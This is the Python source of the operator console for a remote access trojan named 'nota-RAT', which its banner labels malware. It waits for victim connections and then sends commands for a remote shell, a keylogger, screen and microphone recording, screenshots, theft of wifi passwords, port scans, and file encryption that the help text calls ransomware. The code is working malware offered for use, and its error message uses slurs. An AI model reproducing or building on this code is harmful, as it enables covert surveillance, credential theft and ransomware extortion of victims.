import socket
import argparse
import os 
import time
import sys
import random
from threading import Thread
from cryptography.fernet import Fernet
from discord_webhook import DiscordWebhook, DiscordEmbed


parser = argparse.ArgumentParser(
    description="nota-RAT, python reverse shell using sockets."
)

parser.add_argument(
    "-p", "--port", default=421, help="Port of the Server", type=int
)


args = parser.parse_args()
SERVER_HOST = "0.0.0.0"
SERVER_PORT = args.port
BUFFER_SIZE = 1024 * 128
SEPARATOR = "<sep>"
key = b'fXpsGp9mJFfNYCTtGeB2zpY9bzjPAoaC0Fkcc13COy4='
command_list = ["send commands", "help", "get wifi", "clear", "scan ports", "exit", "scan local ports", "record screen", "take screenshot", "start keylogger", "send command", "stop keylogger", "encrypt files", "decrypt files", "record mic"]

''' Colors '''
MAIN = '\033[38;5;50m'
PLOAD = '\033[38;5;119m'
GREEN = '\033[38;5;47m'
BLUE = '\033[0;38;5;12m'
ORANGE = '\033[0;38;5;214m'
RED = '\033[1;31m'
END = '\033[0m'
BOLD = '\033[1m'


''' MSG Prefixes '''
INFO = f'{MAIN}Info{END}'
EXIT = f'{MAIN}Exited{END}'
WARN = f'{ORANGE}Warning{END}'
IMPORTANT = WARN = f'{ORANGE}Important{END}'
FAILED = f'{RED}Fail{END}'
DEBUG = f'{ORANGE}Debug{END}'
INPUT = f'{BLUE}Input{END}'
REMOTE = WARN = f'{ORANGE}Remote{END}'
CLEAR = f'{PLOAD}CLEARD{END}'


print(f"""{PLOAD}
                       __                                    __                                             
                      /  |                                  /  |                                            
 _______    ______   _$$ |_          _____  ____    ______  $$ | __   __   __   ______    ______    ______  
/       \  /      \ / $$   |        /     \/    \  /      \ $$ |/  | /  | /  | /      \  /      \  /      \ 
$$$$$$$  |/$$$$$$  |$$$$$$/         $$$$$$ $$$$  | $$$$$$  |$$ |$$ | $$ | $$ | $$$$$$  |/$$$$$$  |/$$$$$$  |
$$ |  $$ |$$ |  $$ |  $$ | __       $$ | $$ | $$ | /    $$ |$$ |$$ | $$ | $$ | /    $$ |$$ |  $$/ $$    $$ |
$$ |  $$ |$$ \__$$ |  $$ |/  |      $$ | $$ | $$ |/$$$$$$$ |$$ |$$ \_$$ \_$$ |/$$$$$$$ |$$ |      $$$$$$$$/ 
$$ |  $$ |$$    $$/   $$  $$/       $$ | $$ | $$ |$$    $$ |$$ |$$   $$   $$/ $$    $$ |$$ |      $$       |
$$/   $$/  $$$$$$/     $$$$/        $$/  $$/  $$/  $$$$$$$/ $$/  $$$$$/$$$$/   $$$$$$$/ $$/        $$$$$$$/ 
                                                                    {END}nota Malware beta | fluffydolphin                 
""")


s = socket.socket()

s.bind((SERVER_HOST, SERVER_PORT))
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.listen(5)
print(f"[{IMPORTANT}] {BOLD}Awaiting connection on {SERVER_HOST}:{SERVER_PORT} .....{END}")


client_socket, client_address = s.accept()
print(f"[{IMPORTANT}] {BOLD}{client_address[0]}:{client_address[1]} Connected! \n{END}")
time.sleep(1)
print(f'\r[{GREEN}Shell{END}] {BOLD}Stabilizing command prompt .....{END}', end = '\n\n') #yes I stole this from hoax get over it
time.sleep(1.8)


while True:
    try:
        command = input(f"\n[{INPUT}] $> ")
        if command == "exit" or command == "quit" or command == "q":
            exit_choice = input(f"[{IMPORTANT}] Are you sure you want to exit (y/n)? {END}")
            while(exit_choice != "y" and exit_choice != "n"):
                print(f"[{FAILED}] (y/n) \n{END}")
                time.sleep(0.4)
                exit_choice = input(f"[{IMPORTANT}] Are you sure you want to exit (y/n)? {END} ")
            if exit_choice == "y":
                commands = "exit"
                client_socket.send(commands.encode())
                client_socket.close()
                s.close()
                print(f"\n[{EXIT}] {END}\n")
                break
            if exit_choice == "n":
                continue
        if command.lower() == "scan ports":
            port_range = int(input(f"[{IMPORTANT}] How many ports do you want to scan? {END}"))
            print(f"[{IMPORTANT}] scanning .....{END}\n")
            startTime = time.time()
            open_ports = 0

            for i in range(0, port_range):
                host = client_socket.getpeername()[0]
                port = i
                timeout_seconds = 1
                port_scanner_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                port_scanner_socket.settimeout(timeout_seconds)
                result = port_scanner_socket.connect_ex((host,int(port)))
                if result == 0:
                    print(f"[{INFO}] Host: {host}, Port: {port}{END}")
                else:
                    continue
                port_scanner_socket.close()
                open_ports += 1

            print(f"\n[{INFO}] Open ports: {END}" + str(open_ports))
            executionTime = (time.time() - startTime)
            executionTime = int(executionTime)
            print(f'[{INFO}] Execution time in seconds: ' + str(executionTime) + "\n")
        if command.lower() == "scan local ports":
            client_socket.send("start local portscanner".encode())
            port_range = str(input(f"[{IMPORTANT}] How many ports do you want to scan? {END}"))
            print(f"[{IMPORTANT}] scanning .....{END}\n")
            client_socket.send(port_range.encode())
            open_ports = client_socket.recv(BUFFER_SIZE).decode()
            print(open_ports)
            open_portz = client_socket.recv(BUFFER_SIZE).decode()
            print(open_portz)
            executionTime = client_socket.recv(BUFFER_SIZE).decode()
            print(executionTime)

        if command.lower() == "record screen":
            filename = input(f"[{IMPORTANT}] filename of recording: {END}")
            filename = filename + ".mp4"
            client_socket.send(command.encode())
            time_stop = input(f"[{IMPORTANT}] how long do you want to record for: {END}")
            client_socket.send(time_stop.encode())
            print(f"[{IMPORTANT}] recording ......{END}\n")
            remaining = int.from_bytes(client_socket.recv(4),'big')
            f = open(f"./recordings/{filename}","wb")
            while remaining:
                data = client_socket.recv(min(remaining,4096))
                remaining -= len(data)
                f.write(data)
            f.close()
            print(f"[{INFO}] recording recved successfully{END}")
        if command.lower() == "take screenshot":
            filename = input(f"[{IMPORTANT}] filename of screenshot: {END}")
            filename = filename + ".png"
            print(f"[{IMPORTANT}] taking screenshot ......{END}\n")
            client_socket.send(command.encode())
            remaining = int.from_bytes(client_socket.recv(4),'big')
            f = open(f"./screenshots/{filename}","wb")
            while remaining:
                data = client_socket.recv(min(remaining,4096))
                remaining -= len(data)
                f.write(data)
            f.close()
            print(f"[{INFO}] screenshot recved successfully{END}")


        if command.lower() == "start keylogger":
            def keylogger_loop():
                print(f"[{IMPORTANT}] logging keys .....{END}")
                LOGGER_HOST = "0.0.0.0"
                LOGGER_PORT = 422
                l = socket.socket()
                l.bind((LOGGER_HOST, LOGGER_PORT))
                l.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                l.listen(5)
                client_socket.send(command.encode())
                logger_socket, logger_address = l.accept()
                def keylogger():
                    while True:
                        if command.lower() == "stop keylogger":
                            client_socket.send(command.encode())
                            print(f"[{IMPORTANT}] logging stopped{END}")
                            break
                        msg = logger_socket.recv(BUFFER_SIZE).decode()
                        addr = logger_socket.getpeername()[0]
                        with open(f"./logs/{addr}-log.txt", "a+") as file1:
                            file1.write(f"{msg}")
                loggerz = Thread(target=keylogger)
                loggerz.daemon = True
                loggerz.start()
            keylogger_loopz = Thread(target=keylogger_loop)
            keylogger_loopz.daemon = True
            keylogger_loopz.start()
        if command == "send command":
            client_socket.send(command.encode())
            cwd = client_socket.recv(BUFFER_SIZE).decode()
            send_command = input(f"[{REMOTE}] {cwd} $> {END}")
            if not send_command.strip():
                continue
            client_socket.send(send_command.encode())
            output = client_socket.recv(BUFFER_SIZE).decode()
            results, cwd = output.split(SEPARATOR)
            print(results)
        if command == "send commands":
            client_socket.send(command.encode())
            running = True
            cwd = client_socket.recv(BUFFER_SIZE).decode()
            while running:
                send_command = input(f"[{REMOTE}] {cwd} $> {END}")
                if not send_command.strip():
                    continue
                if send_command == "exit":
                    client_socket.send(send_command.encode())
                    break
                client_socket.send(send_command.encode())
                output = client_socket.recv(BUFFER_SIZE).decode()
                results, cwd = output.split(SEPARATOR)
                print(results + "\n")
        if command == "encrypt files":
            client_socket.send(command.encode())
            print(f"[{IMPORTANT}] encrypting files ......{END}")
            print(client_socket.recv(BUFFER_SIZE).decode())
        if command == "decrypt files":
            client_socket.send(command.encode())
            print(f"[{IMPORTANT}] decrpyting files ......{END}")
            print(client_socket.recv(BUFFER_SIZE).decode())
        if command == "record mic":
            filename = input(f"[{IMPORTANT}] filename of mic audio: {END}")
            filename = filename + ".wav"
            client_socket.send(command.encode())
            record_time = input(f"[{IMPORTANT}] how long do you want to record for: {END}")
            client_socket.send(record_time.encode())
            print(f"[{IMPORTANT}] recording mic ......{END}\n")
            remaining = int.from_bytes(client_socket.recv(4),'big')
            f = open(f"./microphone/{filename}","wb")
            while remaining:
                data = client_socket.recv(min(remaining,4096))
                remaining -= len(data)
                f.write(data)
            f.close()
            print(f"[{INFO}] audio recved successfully{END}")
        if command == "get wifi":
            print(f"[{IMPORTANT}] getting wifi profiles{END}")
            client_socket.send("get wifi".encode())
            print(client_socket.recv(BUFFER_SIZE).decode())
        if command == "clear":
            def clear():
                os.system('cls' if os.name=='nt' else 'clear')
                return("   ")
            clear()
            print(f"[{IMPORTANT}] ")
        if command == "help":
                print(
        f'''{MAIN}
        \r  Command                    Description
        \r  -------                    -----------
        \r  help                       Print this message.
        \r  get wifi                   Gets SSIDs and security key.
        \r  scan ports                 Scans all external ports.
        \r  scan local ports           Scans all internal ports.
        \r  record screen              Records screen for a certain amount of time.
        \r  record mic                 Records mic for a certain amount of time.
        \r  take screenshot            Takes a screenshot.
        \r  start keylogger            Starts keylogger.
        \r  stop keylogger             Stops keylogger.
        \r  send command               Sends a single command.
        \r  send commands              Sends multiple commands.
        \r  encrypt files              Deploys ransomware.
        \r  decrypt files              Removes ransomware.         
        \r  clear                      Clear screen.
        \r  exit/quit/q                Close session and exit.
        {END}''')
        if command not in command_list:
            print(f"[{FAILED}] that aint a command cunt try again retard!! {END}\n")
    except KeyboardInterrupt:
        exit_choice = input(f"\n[{IMPORTANT}] Are you sure you want to exit (y/n)? {END}")
        while(exit_choice != "y" and exit_choice != "n"):
            print(f"[{FAILED}] (y/n) \n{END}")
            time.sleep(0.4)
            exit_choice = input(f"[{IMPORTANT}] Are you sure you want to exit (y/n)? {END} ")
        if exit_choice == "y":
            commands = "exit"
            client_socket.send(commands.encode())
            client_socket.close()
            s.close()
            print(f"\n[{EXIT}] {END}\n")
            break
        if exit_choice == "n":
            continue

client_socket.close()
s.close()
